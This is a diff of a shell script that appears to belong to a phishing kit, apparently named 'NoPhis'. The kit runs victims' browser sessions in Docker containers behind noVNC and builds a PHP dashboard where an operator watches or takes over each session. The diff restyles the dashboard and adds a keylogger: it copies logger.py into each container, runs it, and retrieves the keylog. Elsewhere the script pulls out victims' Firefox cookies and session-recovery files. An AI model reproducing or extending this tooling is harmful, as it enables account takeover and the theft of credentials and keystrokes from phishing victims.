@@ -147,68 +147,79 @@ case "$1" in
         
         echo '
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<title>NoPhis status</title>
-<style>
-body {
-    background-color: rgb(9, 25, 75);
-    margin: 0;
-    padding: 0;
-}
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=0.3">
+  <style>
+  
+    body {
+      background: #101f30;
+    }
+    
+    /* Style the iframe container */
+    .iframe-container {
+      display: flex;
+      flex-wrap: wrap;
+      position: relative; /* Set container as the positioning context for absolute positioning */
+    }
 
-.container {
-    background-color: rgb(56, 74, 99);
-    width: 180vh;
-    height: 80vh;
-    border-radius: 10px;
-    overflow: hidden;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    margin: 20px auto;
-    position: relative;
-}
+    /* Style each iframe wrapper */
+    .iframe-wrapper {
+      position: relative; /* Ensure relative positioning for absolute positioning inside */
+      width: calc(50% - 2%); /* Adjust width as needed */
+      margin: 1%; /* Adjust margin as needed */
+      box-sizing: border-box; /* Include padding and border in the width and height */
+    }
 
-#scaled-iframe {
-    min-width: 1600px;
-    min-height: 900px;
-    -ms-zoom: 0.5;
-    -moz-transform: scale(0.5);
-    -moz-transform-origin: middle;
-    -o-transform: scale(0.5);
-    -o-transform-origin: middle;
-    -webkit-transform: scale(0.5);
-    -webkit-transform-origin: middle;
-}
+    /* Style each iframe */
+    .custom-iframe {
+      height: 500px;
+      width: 100%; /* Make iframe take 100% width of its container */
+      border: 1px solid #ccc;
+      border-radius: 10px;
+    }
 
-.buttons-container {
-    display: flex;
-    flex-direction: column;
-    align-items: flex-start; /* Align buttons to the left within the container */
-    justify-content: space-between; /* Add equal space between buttons */
-    background-color: rgb(56, 74, 99);
-    border-radius: 10px;
-    padding: 10px;
-    margin-right: 400px; /* Add spacing between bigger container and buttons container */
-}
+    /* Style the buttons inside the iframe wrapper */
+    .iframe-buttons {
+      position: absolute;
+      bottom: 10px; /* Adjust the distance from the bottom as needed */
+      left: 50%;
+      transform: translateX(-50%);
+      text-align: center;
+    }
 
-.orange-button {
-    background-color: orange;
-    color: white;
-    border: none;
-    border-radius: 5px;
-    padding: 10px 30px;
-    font-size: 16px;
-    cursor: pointer;
-    text-decoration: none;
-    white-space: nowrap;
-    margin-bottom: 10px; /* Add bottom margin for spacing between buttons */
-}
-</style>
+    .iframe-button {
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      margin: 5px; /* Adjust margin as needed */
+      display: none; /* Initially hide the buttons */
+      text-decoration: none;
+      font-size: 16px; /* Adjust font size as needed */
+      font-family: 'Arial', sans-serif; /* Adjust font family as needed */
+      font-weight: bold; /* Adjust font weight as needed */
+      border-radius: 5px;
+    }
+
+    /* Show the buttons when hovering over the iframe wrapper */
+    .iframe-wrapper:hover .iframe-buttons .iframe-button {
+      display: block;
+    }
+
+    /* Media query for smaller screens */
+    @media screen and (max-width: 1500px) {
+      .iframe-wrapper {
+        width: 100%; /* Set to 100% width for smaller screens */
+        margin: 2% 0; /* Adjust margin as needed */
+      }
+    }
+  </style>
 </head>
 
-  <?php
+<body>
+ <?php
     if (isset($_POST["create_file"])) {
         // Get the value of the file content from the form input
         $file_content = $_POST["file_content"];
@@ -304,7 +315,7 @@ body {
     }
     ?>
 
- 
+    <div class="iframe-container">
 	' > ./output/status.php
         
 	declare -a urls=()
@@ -313,7 +324,7 @@ body {
 	do
 	    PW=$(openssl rand -hex 14)
 	    AdminPW=$(tr -dc 'A-Za-z0-9!' < /dev/urandom | head -c 32)
-	    sudo docker run -dit --name vnc-user$c -e VNC_PW=$PW -e NOVNC_HEARTBEAT=30 vnc-docker &> /dev/null
+	    sudo docker run -dit --name vnc-user$c -e VNC_PW=$PW -e NOVNC_HEARTBEAT=30 vnc-docker 
 	    sleep 1
 	    sudo docker exec vnc-user$c sh -c "firefox &" &> /dev/null
 	    sleep 1
@@ -353,7 +364,10 @@ body {
 	    	
 	    fi
 	    
-	    
+	    # Keylogger
+	    sudo docker cp ./vnc/logger.py vnc-user$c:/home/headless/   
+	    sleep 1
+	    sudo docker exec -dit vnc-user$c sh -c "python3 /home/headless/logger.py"     
 	    
 	    
 	    sudo docker exec vnc-user$c sh -c "xfconf-query --channel xsettings --property /Gtk/CursorThemeName --set WinCursor &" 
@@ -380,41 +394,46 @@ body {
 	if [ -n "$SSL" ]
 	then
 		echo "
-                  <div class='container'>
-			<iframe id='scaled-iframe' src='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true'></iframe>
-			<form action='' method='post'>
-			<div class='buttons-container'>
-			    <a href='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' class='orange-button'>View user Session  $c</a>
-                            <input type='hidden' name='file_content' value='$Domain/$PW/websockify $Domain'>
-                            <input type='hidden' name='file_content2' value='$Domain/$PW/conn.html $Domain'>
-                            <input type='hidden' name='ip_value' value='$CIP'>
-			    <button type='submit' name='create_file' class='orange-button'>Disconnect User Session</button>
-			    <a href='https://$Domain:65534/angler/$PW/conn.html?path=/angler/$PW/websockify&password=$PW&autoconnect=true&resize=remote' class='orange-button'>Connect to Session $c</a>
+		    <div class='iframe-wrapper'>
+		      <iframe class='custom-iframe' src='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true'></iframe>
+		      <!-- Form for file creation -->
+		      <form method='post'>
+			<!-- Buttons inside the wrapper -->
+			<div class='iframe-buttons'>
+			  <a class='iframe-button' href='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' target='_blank' > View </a>
+			  <input type='hidden' name='file_content' value='$Domain/$PW/websockify $Domain'>
+			  <input type='hidden' name='file_content2' value='$Domain/$PW/conn.html $Domain'>
+			  <input type='hidden' name='ip_value' value='$CIP'>
+			  <button type='submit' name='create_file' class='iframe-button'>Disconnect</button>
+			  <a class='iframe-button' href='https://$Domain:65534/angler/$PW/conn.html?path=/angler/$PW/websockify&password=$PW&autoconnect=true&resize=remote' target='_blank'>Connect</a>
 			</div>
-			</form>
-		    </div>
+		      </form>
+		    </div>		    
 		" >> ./output/status.php
 		urls+=("https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote")
 	else
 		echo "
-                  <div class='container'>
-			<iframe id='scaled-iframe' src='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true'></iframe>
-			<form action='' method='post'>
-			<div class='buttons-container'>
-			    <a href='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' class='orange-button'>View user Session  $c</a>
-                            <input type='hidden' name='file_content' value='$Domain/$PW/websockify $Domain'>
-                            <input type='hidden' name='file_content2' value='$Domain/$PW/conn.html $Domain'>
-                            <input type='hidden' name='ip_value' value='$CIP'>
-			    <button type='submit' name='create_file' class='orange-button'>Disconnect User Session</button>
-			    <a href='http://$Domain:65534/angler/$PW/conn.html?path=/angler/$PW/websockify&password=$PW&autoconnect=true&resize=remote' class='orange-button'>Connect to Session $c</a>
+		    <div class='iframe-wrapper'>
+		      <iframe class='custom-iframe' src='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true'></iframe>
+		      <!-- Form for file creation -->
+		      <form method='post'>
+			<!-- Buttons inside the wrapper -->
+			<div class='iframe-buttons'>
+			  <a class='iframe-button' href='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' target='_blank' > View </a>
+			  <input type='hidden' name='file_content' value='$Domain/$PW/websockify $Domain'>
+			  <input type='hidden' name='file_content2' value='$Domain/$PW/conn.html $Domain'>
+			  <input type='hidden' name='ip_value' value='$CIP'>
+			  <button type='submit' name='create_file' class='iframe-button'>Disconnect</button>
+			  <a class='iframe-button' href='http://$Domain:65534/angler/$PW/conn.html?path=/angler/$PW/websockify&password=$PW&autoconnect=true&resize=remote' target='_blank'>Connect</a>
 			</div>
-			</form>
+		      </form>
 		    </div>
 		" >> ./output/status.php
 		urls+=("http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote")
 	fi
 	done
 	echo "
+	    </div>
 	</body>
 	</html>
         " >> ./output/status.php
@@ -504,6 +523,7 @@ body {
            pushd ./output &> /dev/null
            sudo docker exec vnc-user$c sh -c "find -name recovery.jsonlz4 -exec cp {} /home/headless/ \;"
            sudo docker exec vnc-user$c sh -c "find -name cookies.sqlite -exec cp {} /home/headless/ \;"
+           sudo docker exec vnc-user$c test -e /home/headless/Keylog.txt && sudo docker cp vnc-user$c:/home/headless/Keylog.txt ./user$c-keylog.txt
            sleep 2
            sudo docker cp vnc-user$c:/home/headless/recovery.jsonlz4 ./user$c-recovery.jsonlz4
            sudo docker cp vnc-user$c:/home/headless/cookies.sqlite ./user$c-cookies.sqlite
